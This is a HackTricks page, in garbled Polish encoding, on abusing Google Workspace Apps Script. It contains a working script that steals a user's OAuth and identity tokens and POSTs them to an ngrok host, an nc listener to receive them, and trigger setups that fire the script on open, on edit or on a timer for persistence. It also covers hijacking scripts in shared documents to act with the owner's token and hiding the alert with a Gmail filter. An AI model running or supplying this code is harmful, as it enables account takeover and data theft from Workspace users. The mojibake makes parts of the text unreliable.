# GWS - App Scripts

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## App Scripts

App Scripts to **kod, ktÃ³ry zostanie uruchomiony, gdy uÅ¼ytkownik z uprawnieniami edytora uzyska dostÄ™p do dokumentu, z ktÃ³rym powiÄ…zany jest App Script** i po **zaakceptowaniu monitu OAuth**.\
MogÄ… byÄ‡ rÃ³wnieÅ¼ ustawione do **wykonywania co pewien czas** przez wÅ‚aÅ›ciciela App Script (Persistence).

### Create App Script

Istnieje kilka sposobÃ³w na stworzenie App Script, chociaÅ¼ najczÄ™stsze to **z dokumentu Google (dowolnego typu)** i jako **projekt samodzielny**:

<details>

<summary>Create a container-bound project from Google Docs, Sheets, or Slides</summary>

1. OtwÃ³rz dokument Docs, arkusz Sheets lub prezentacjÄ™ Slides.
2. Kliknij **Rozszerzenia** > **Google Apps Script**.
3. W edytorze skryptÃ³w kliknij **Bez tytuÅ‚u**.
4. Nadaj swojemu projektowi nazwÄ™ i kliknij **ZmieÅ„ nazwÄ™**.

</details>

<details>

<summary>Create a standalone project</summary>

Aby stworzyÄ‡ projekt samodzielny z Apps Script:

1. PrzejdÅº do [`script.google.com`](https://script.google.com/).
2. Kliknij dodaj **Nowy projekt**.
3. W edytorze skryptÃ³w kliknij **Bez tytuÅ‚u**.
4. Nadaj swojemu projektowi nazwÄ™ i kliknij **ZmieÅ„ nazwÄ™**.

</details>

<details>

<summary>Create a standalone project from Google Drive</summary>

1. OtwÃ³rz [Google Drive](https://drive.google.com/).
2. Kliknij **Nowy** > **WiÄ™cej** > **Google Apps Script**.

</details>

<details>

<summary>Create a container-bound project from Google Forms</summary>

1. OtwÃ³rz formularz w Google Forms.
2. Kliknij WiÄ™cej more\_vert > **Edytor skryptÃ³w**.
3. W edytorze skryptÃ³w kliknij **Bez tytuÅ‚u**.
4. Nadaj swojemu projektowi nazwÄ™ i kliknij **ZmieÅ„ nazwÄ™**.

</details>

<details>

<summary>Create a standalone project using the clasp command line tool</summary>

`clasp` to narzÄ™dzie wiersza poleceÅ„, ktÃ³re pozwala tworzyÄ‡, pobieraÄ‡/wysyÅ‚aÄ‡ i wdraÅ¼aÄ‡ projekty Apps Script z terminala.

Zobacz [Przewodnik po interfejsie wiersza poleceÅ„ z uÅ¼yciem `clasp`](https://developers.google.com/apps-script/guides/clasp) po wiÄ™cej szczegÃ³Å‚Ã³w.

</details>

## App Script Scenario <a href="#create-using-clasp" id="create-using-clasp"></a>

### Create Google Sheet with App Script

Zacznij od stworzenia App Script, mojÄ… rekomendacjÄ… w tym scenariuszu jest stworzenie arkusza Google i przejÅ›cie do **`Rozszerzenia > App Scripts`**, to otworzy **nowy App Script powiÄ…zany z arkuszem**.

### Leak token

Aby uzyskaÄ‡ dostÄ™p do tokena OAuth, musisz kliknÄ…Ä‡ **`UsÅ‚ugi +` i dodaÄ‡ zakresy takie jak**:

* **AdminDirectory**: Uzyskaj dostÄ™p do uÅ¼ytkownikÃ³w i grup w katalogu (jeÅ›li uÅ¼ytkownik ma wystarczajÄ…ce uprawnienia)
* **Gmail**: Aby uzyskaÄ‡ dostÄ™p do danych gmail
* **Drive**: Aby uzyskaÄ‡ dostÄ™p do danych dysku
* **Google Sheets API**: Aby dziaÅ‚aÅ‚o z wyzwalaczem

Aby samodzielnie zmieniÄ‡ **potrzebne zakresy**, moÅ¼esz przejÅ›Ä‡ do ustawieÅ„ projektu i wÅ‚Ä…czyÄ‡: **`PokaÅ¼ plik manifestu "appsscript.json" w edytorze`.**

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

Aby przechwyciÄ‡ Å¼Ä…danie, wystarczy uruchomiÄ‡:
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
Permissions requested to execute the App Script:

<figure><img src="../../../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Gdy zostanie zÅ‚oÅ¼one zewnÄ™trzne Å¼Ä…danie, okno OAuth rÃ³wnieÅ¼ **poprosi o pozwolenie na dostÄ™p do zewnÄ™trznych punktÃ³w koÅ„cowych**.
{% endhint %}

### Create Trigger

Po odczytaniu aplikacji kliknij **â° Triggers**, aby utworzyÄ‡ wyzwalacz. Jako **funkcjÄ™** do uruchomienia wybierz **`getToken`**, uruchamiaj w wdroÅ¼eniu **`Head`**, w ÅºrÃ³dle zdarzenia wybierz **`From spreadsheet`** a w typie zdarzenia wybierz **`On open`** lub **`On edit`** (zgodnie z potrzebami) i zapisz.

ZauwaÅ¼, Å¼e moÅ¼esz sprawdziÄ‡ **wykonywanie skryptÃ³w aplikacji w zakÅ‚adce Wykonania**, jeÅ›li chcesz coÅ› zdebugowaÄ‡.

### Sharing

Aby **wyzwoliÄ‡** **App Script**, ofiara musi poÅ‚Ä…czyÄ‡ siÄ™ z **dostÄ™pem edytora**.

{% hint style="success" %}
**Token** uÅ¼yty do wykonania **App Script** bÄ™dzie tokenem **twÃ³rcy wyzwalacza**, nawet jeÅ›li plik jest otwarty jako Edytor przez innych uÅ¼ytkownikÃ³w.
{% endhint %}

### Abusing Shared With Me documents

{% hint style="danger" %}
JeÅ›li ktoÅ› **udostÄ™pniÅ‚ Ci dokument z App Scripts i wyzwalaczem uÅ¼ywajÄ…cym Head** skryptu aplikacji (nie staÅ‚ego wdroÅ¼enia), moÅ¼esz zmodyfikowaÄ‡ kod App Script (dodajÄ…c na przykÅ‚ad funkcje kradnÄ…ce token), uzyskaÄ‡ do niego dostÄ™p, a **App Script zostanie wykonany z uprawnieniami uÅ¼ytkownika, ktÃ³ry udostÄ™pniÅ‚ Ci dokument**! (zauwaÅ¼, Å¼e token OAuth wÅ‚aÅ›ciciela bÄ™dzie miaÅ‚ zakresy dostÄ™pu te, ktÃ³re zostaÅ‚y nadane, gdy wyzwalacz zostaÅ‚ utworzony).

**Powiadomienie zostanie wysÅ‚ane do twÃ³rcy skryptu informujÄ…ce, Å¼e ktoÅ› zmodyfikowaÅ‚ skrypt** (co powiesz na uÅ¼ycie uprawnieÅ„ gmail do wygenerowania filtru, aby zapobiec powiadomieniu?)
{% endhint %}

{% hint style="success" %}
JeÅ›li **atakujÄ…cy zmodyfikuje zakresy App Script**, aktualizacje **nie zostanÄ… zastosowane** do dokumentu, dopÃ³ki nie zostanie utworzony **nowy wyzwalacz** z wprowadzonymi zmianami. Dlatego atakujÄ…cy nie bÄ™dzie w stanie ukraÅ›Ä‡ tokena wÅ‚aÅ›ciciela z wiÄ™kszymi zakresami niÅ¼ te, ktÃ³re ustawiÅ‚ w wyzwalaczu, ktÃ³ry utworzyÅ‚.
{% endhint %}

### Copying instead of sharing

Gdy tworzysz link do udostÄ™pnienia dokumentu, tworzony jest link podobny do tego: `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
JeÅ›li **zmienisz** koÅ„cÃ³wkÄ™ **"/edit"** na **"/copy"**, zamiast uzyskaÄ‡ do niego dostÄ™p, Google zapyta, czy chcesz **wygenerowaÄ‡ kopiÄ™ dokumentu:**

<figure><img src="../../../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

JeÅ›li uÅ¼ytkownik skopiuje go i uzyska do niego dostÄ™p, zarÃ³wno **zawartoÅ›Ä‡ dokumentu, jak i App Scripts zostanÄ… skopiowane**, jednak **wyzwalacze nie**, dlatego **nic nie zostanie wykonane**.

### Sharing as Web Application

ZauwaÅ¼, Å¼e moÅ¼liwe jest rÃ³wnieÅ¼ **udostÄ™pnienie App Script jako aplikacji internetowej** (w Edytorze App Script, wdroÅ¼ jako aplikacjÄ™ internetowÄ…), ale pojawi siÄ™ alert taki jak ten:

<figure><img src="../../../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

NastÄ™pnie pojawi siÄ™ **typowe okno OAuth proszÄ…ce** o potrzebne uprawnienia.

### Testing

MoÅ¼esz przetestowaÄ‡ zebrany token, aby wylistowaÄ‡ e-maile za pomocÄ…:

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

Lista kalendarza uÅ¼ytkownika:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## App Script jako Utrzymanie

JednÄ… z opcji na utrzymanie byÅ‚oby **utworzenie dokumentu i dodanie wyzwalacza dla funkcji getToken** oraz udostÄ™pnienie dokumentu atakujÄ…cemu, aby za kaÅ¼dym razem, gdy atakujÄ…cy otworzy plik, **ekstrahowaÅ‚ token ofiary.**

MoÅ¼liwe jest rÃ³wnieÅ¼ stworzenie App Script i ustawienie go tak, aby wyzwalaÅ‚ siÄ™ co X czasu (na przykÅ‚ad co minutÄ™, godzinÄ™, dzieÅ„...). AtakujÄ…cy, ktÃ³ry **skompromentowaÅ‚ dane uwierzytelniajÄ…ce lub sesjÄ™ ofiary, mÃ³gÅ‚by ustawiÄ‡ wyzwalacz czasowy App Script i codziennie **ujawniaÄ‡ bardzo uprzywilejowany token OAuth**:

Po prostu utwÃ³rz App Script, przejdÅº do Wyzwalaczy, kliknij Dodaj Wyzwalacz i wybierz jako ÅºrÃ³dÅ‚o zdarzenia Czasowe oraz wybierz opcje, ktÃ³re najlepiej Ci odpowiadajÄ…:

<figure><img src="../../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
To spowoduje utworzenie powiadomienia o bezpieczeÅ„stwie w formie e-maila oraz wiadomoÅ›ci push na Twoim telefonie, informujÄ…cej o tym.
{% endhint %}

### OminiÄ™cie Niezatwierdzonego Monitu w UdostÄ™pnionym Dokumencie

Co wiÄ™cej, jeÅ›li ktoÅ› **udostÄ™pniÅ‚** Ci dokument z **dostÄ™pem edytora**, moÅ¼esz generowaÄ‡ **App Scripts wewnÄ…trz dokumentu**, a **WÅAÅšCICIEL (twÃ³rca) dokumentu bÄ™dzie wÅ‚aÅ›cicielem App Script**.

{% hint style="warning" %}
To oznacza, Å¼e **twÃ³rca dokumentu bÄ™dzie siÄ™ pojawiaÅ‚ jako twÃ³rca kaÅ¼dego App Script**, ktÃ³ry ktokolwiek z dostÄ™pem edytora utworzy wewnÄ…trz niego.

To rÃ³wnieÅ¼ oznacza, Å¼e **App Script bÄ™dzie zaufany przez Å›rodowisko Workspace** twÃ³rcy dokumentu.
{% endhint %}

{% hint style="danger" %}
To rÃ³wnieÅ¼ oznacza, Å¼e jeÅ›li **App Script juÅ¼ istniaÅ‚** i ludzie **przyznali dostÄ™p**, ktokolwiek z **uprawnieniami Edytora** w dokumencie moÅ¼e **zmodyfikowaÄ‡ go i naduÅ¼yÄ‡ tego dostÄ™pu.**\
Aby naduÅ¼yÄ‡ tego, potrzebujesz rÃ³wnieÅ¼, aby ludzie wyzwalali App Script. A jednym z fajnych trikÃ³w jest **opublikowanie skryptu jako aplikacji internetowej**. Gdy **ludzie**, ktÃ³rzy juÅ¼ przyznali **dostÄ™p** do App Script, odwiedzÄ… stronÄ™ internetowÄ…, **wyzwolÄ… App Script** (to dziaÅ‚a rÃ³wnieÅ¼ przy uÅ¼yciu tagÃ³w `<img>`).
{% endhint %}

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na githubie.

</details>
{% endhint %}
